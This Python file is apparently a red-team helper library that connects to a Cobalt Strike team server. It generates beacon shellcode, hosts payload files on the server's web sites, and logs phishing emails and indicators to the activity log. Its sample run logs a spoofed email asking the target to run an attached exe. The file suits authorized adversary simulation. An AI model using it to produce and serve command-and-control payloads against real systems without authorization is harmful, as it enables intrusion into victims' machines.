#!/usr/local/bin/python3

# The idea for this tool and some code came from redshell: https://github.com/Verizon/redshell

# This tool will connect to a cobalt strike team server to perform various tasks such as payload generation, hosting files, and other fun tasks

# It can also be imported like a library to be used by other tools. 
# If used as a library, the items won't be printed to the console, as this is done in the Main function

import pexpect
import getpass
from os import path
from re import findall, DOTALL, VERBOSE
import base64
# I really need to do better with pexpect to avoid the hardcoded sleeps
# This is a temp fix that will probably make it into production
from time import sleep
import sys

### Start CSConnector Class ###
class CSConnector:
	def __init__(self, cs_host, cs_user, cs_pass=None, cs_directory="./", cs_port=50050):
		self.cs_host = cs_host
		self.cs_user = cs_user + "_striker"
		if not cs_pass:
			self.cs_pass = getpass.getpass("Enter Cobalt Strike password: ")
		else:
			self.cs_pass = cs_pass
		self.cs_port = cs_port
		self.cs_directory = cs_directory
		# NOTE: This is known to work for CS 4.0 and 4.1. This may change in future versions. Possibly look into leveraging CS's agg script (not included on Mac OS systems)
		self.aggscriptcmd = "java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -classpath '{}/cobaltstrike.jar' aggressor.headless.Start".format(self.cs_directory)
		# This gets populated once the connect function is run (in the future, maybe run that function in the initialization?)
		self.cs_process = None

	def __enter__(self):
		self.connectTeamserver()
		return self

	def __exit__(self, type, value, tb):

		self.disconnectTeamserver()


	##### Payload Generation #######
	# This section is for functions that leverage Cobalt Strike's native as well as custom CNA scripts to generate various payloads

	# Returns a byte[]
	def generateShellcode(self, 
							listener,  
							staged=False, 
							x64=True):
		
		shellcode = None
		if x64:
			arch = "x64"
		else:
			arch = "x86"

		if staged:
			# use artifact_stager()
			self.cs_process.sendline("e println(base64_encode(artifact_stager('{}', 'raw', '{}')));".format(listener, arch))

			self.cs_process.expect('> ', timeout=30000)

			shellcode = findall(';.*?(.*)aggressor.*', self.cs_process.before.decode(), DOTALL | VERBOSE)[0].strip().splitlines()[0]
			
		else:
			# use artifact_payload(listener, "raw", )
			cmd = "e println(base64_encode(artifact_payload('{}', 'raw', '{}')));".format(listener, arch)
			self.cs_process.sendline(cmd)

			self.cs_process.expect('> ', timeout=30000)

			shellcode = findall(';.*?(.*)aggressor.*', self.cs_process.before.decode(), DOTALL | VERBOSE)[0].strip().splitlines()[0]
		
		# We converted the bytes to b64 for transferring, so now convert them back
		return base64.b64decode(shellcode)

	##### Payload/File Hosting ########
	# This section is for functions for hosting and taking down files using Cobalt Strike's Sites functionality

	# Hosts a non-binary file
	# Returns the full URL as a string
	def hostPlainFile(self, 
					file_path, 
					site=None, 
					port=80, 
					uri='/hosted.txt', 
					mime_type='text/plain', 
					description='Autohosted File', 
					use_ssl=False):

		# If no site is provided, we can grab the local IP, but we need to not wrap it in quotes
		if not site:
			# Could also use the normal sendline with 'x localip()'
			self.ag_sendline("println(localip())")
			self.cs_process.expect('.*aggressor.*> ')
			local_ips = findall('([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})', self.cs_process.after.decode())
			if local_ips[0]:
				site="\"{}\"".format(local_ips[0])
			else:
				# something went wrong and my code probably sucks. Fall back to Mudge's smarter brain
				site="localip()"
		else:
		# Since we aren't wrapping in doublequotes in the command due to the possible usage of a function, we need to do it here
			site="\"{}\"".format(site)

		if use_ssl:
			link = "https://{}:{}{}".format(site.strip('\"'), port, uri)
		else:
			link = "http://{}:{}{}".format(site.strip('\"'), port, uri)

		if use_ssl:
			use_ssl = "true"
		else:
			use_ssl = "false"

		cmd = 'site_host({}, {}, "{}", $content, "{}", "{}", {})'.format(site, port, uri, mime_type, description, use_ssl)

		
		# We need to try to figure out if this is an absolute path or a relative path
		if file_path[0] == '/':
			self.ag_sendline("$handle = openf('{}')".format(file_path))
		else:
			self.ag_sendline("$handle = openf(script_resource('{}'))".format(file_path))
		self.ag_sendline("$content = readb($handle, -1)")
		self.ag_sendline("closef($handle)")
		self.ag_sendline(cmd)
		sleep(2)
		self.cs_process.expect('.*aggressor.*> ')
		#print(self.cs_process.after.decode())

		return link

	##### Log Item to Teamserver ######
	# This section is for functions that allow you to write information to the teamserver which will show up in the activity log
	def logToEventLog(self, string, event_type=None):
		if event_type == "ioc":
			self.ag_sendline('elog("Indicator of Compromise: {}")'.format(string))
		elif event_type == "external":
			self.ag_sendline('elog("External Action Taken: {}")'.format(string))
		else:
			self.ag_sendline('elog("Striker String Log: {}")'.format(string))
		# I hate cobalt strike, so you need to sleep after logging to give it time to get there...
		sleep(2)

	def logEmail(self, 
				email_to, 
				email_from, 
				email_sender_ip, 
				email_subject, 
				iocs: dict = None ):

	# NOTE: IOCs looked terrible in Activity Report. Change this so that each IoC is sent individually
		
		# Let's build the basic string, then add the iocs
		elog_string = "Phishing email sent:\\nSending IP: {}\\nTo: {}\\nFrom: {}\\nSubject: {}\\n".format(email_sender_ip, email_to, email_from, email_subject)



		if iocs:
			# Let's add a section for IoCs related specifically to the sent email (attachments, links, etc.)
			ioc_string = "Email IoCs: \\n"
			for ioc_name in iocs.keys():
				ioc_string = ioc_string + "- {}: {}\\n".format(ioc_name, iocs[ioc_name])
			elog_string = elog_string + ioc_string
		self.ag_sendline('elog("{}")'.format(elog_string))
		# I hate cobalt strike, so you need to sleep after logging to give it time to get there...
		sleep(2)



	def logToBeaconLog(self, bid, string, attack_id=None):
		# AttackID is the MITRE ATT&CK Technique ID, if applicable
		self.ag_sendline('btask({}, "{}", "{}")'.format(bid, attack_id, string))
		# I hate cobalt strike, so you need to sleep after logging to give it time to get there...
		sleep(1)

	def getEmailLogs():
		#e foreach $index => $entry (archives()) { if ( "Phishing email sent:*" iswm $entry["data"] ) { println("$entry['data']")}; }

		pass

	def getEmailIoCs():
		#e foreach $index => $entry (archives()) { if ( "IoC:*" iswm $entry["data"] ) { println("$entry['data'] at " .dstamp($entry['when']))}; }

		# Should start with "Email Indicator of Compromise: [name] - [data]"?
		pass

	def getIoCs():
		#e foreach $index => $entry (archives()) { if ( "IoC:*" iswm $entry["data"] ) { println("$entry['data'] at " .dstamp($entry['when']))}; }
		pass

	##### Helper Functions #####
	# This section is for helper functions used throughout the rest of the script 
	# such as grabbing useful information from the team server like the names of listeners running

	def getListeners(self):
		pass

	def connectTeamserver(self):
		"""Connect to CS team server"""

		# In my testing, I found that there were issues sending too many 
		# messages to event log over one connection ( => ~7), so I recommend
		# creating a new object every so often or disconnecting and reconnecting.
		# This issue needs to be troubleshot (troubleshooted?) in the future



		if not path.exists("{}{}".format(self.cs_directory, "/cobaltstrike.jar")):
			# Pretty sure perror is part of Cmd which redshell used. Probably going to need to change this
			print("Error: Cobalt Strike JAR file not found")
			# Might want to exit rather than return. TBD.
			return

		# prompt user for team server password
		#
		command = "{} {} {} {} {}".format(self.aggscriptcmd,
										self.cs_host,
										self.cs_port,
										self.cs_user,
										self.cs_pass)
		#print(command)
		# spawn agscript process
		self.cs_process = pexpect.spawn("{} {} {} {} {}".format(self.aggscriptcmd,
																			self.cs_host,
																			self.cs_port,
																			self.cs_user,
																			self.cs_pass))

		
		# check if process is alive
		if not self.cs_process.isalive():
			print("Error connecting to CS team server! Check config and try again.")
			return
		else:
			pass
			#print("Alive")                                                          

		# We want to wait for the server to be fully synchronized, so we use Cobalt Strike's "on ready {}" event handler 
		try:
			#sleep(3)
			self.cs_process.sendline('e on ready { println("Successfully" . " connected to teamserver!"); }')
			self.cs_process.expect('.*Successfully connected to teamserver!.*')
			#print(self.cs_process.after)
		except:
			print("Error connecting to CS team server! Check config and try again.")
			return
		
		#self.poutput("Connecting...")

		# upon successful connection, display status
		#self.do_status('')

	def disconnectTeamserver(self):
		"""Disconnect from CS team server"""

		# close the agscript process
		if self.cs_process:
			self.cs_process.close()
		else:
			print("CS was already disconnected! Hopefully you already knew this.")

		# clear config vars
		#self.socks_port = ''
		#self.beacon_pid = ''
		#self.bid = ''
		#self.socks_port_connected = False

	def ag_sendline(self, cmd, script_console_command='e'):
		full_cmd = "{} {};".format(script_console_command, cmd)
		self.cs_process.sendline(full_cmd)


	def parse_aggressor_properties(path="~/.aggressor.prop"):
		# Add something to be able to pull team server and password info from this file
		pass


### End CSConnector Class ###


##### Main ########

def parseArguments():
	parser = ArgumentParser()

	parser.add_argument("-t", "--teamserver", help="the hostname or IP address of the teamserver", required=True)
	parser.add_argument("-u", "--user", help="the user to connect to the teamserver as (_striker will be added)", default=environ.get('USER'))
	# TODO: Make this requirement optional and if not provided, secure prompt for password
	parser.add_argument("-p", "--password", help="the password for the teamserver, if not provided, you will be prompted", default=None)
	parser.add_argument("-P", "--port", help="the port for the teamserver, default is 50050", default=50050)
	parser.add_argument("-j", "--javadir", help="the path to the directory containing the Cobalt Strike JAR file", default="./")

	args = parser.parse_args()
	return args


def main():
	args = parseArguments()

	with CSConnector(args.teamserver, 
					args.user, 
					args.password, 
					args.javadir, 
					args.port) as cs:
		#link = cs.hostPlainFile("/Users/nameless/Desktop/stageless_64.xml")
		#print("Go get your payload at {}".format(link))
		email_ip = "217.9.113.2"
		email_to = "testing@target.domain"
		email_from = "spoofed@good.domain"
		email_subject = "Please click link and run EXE"
		email_iocs = dict()
		email_iocs["Attachment 1 Name"] =  "Test.exe"
		email_iocs["Attachment 1 MD5"] = "AAAAAAAAAAAAAAAAAAAA"
		email_iocs["Attachment 1 SHA1"] =  "AAAAAAAAAAAAAAAAAAAA666666777"
		cs.logEmail(email_to, email_from, email_ip, email_subject, email_iocs)

if __name__ == '__main__':
	# There are some imports which aren't used when this is a library, so they are imported here instead
	from argparse import ArgumentParser
	from os import environ
	main()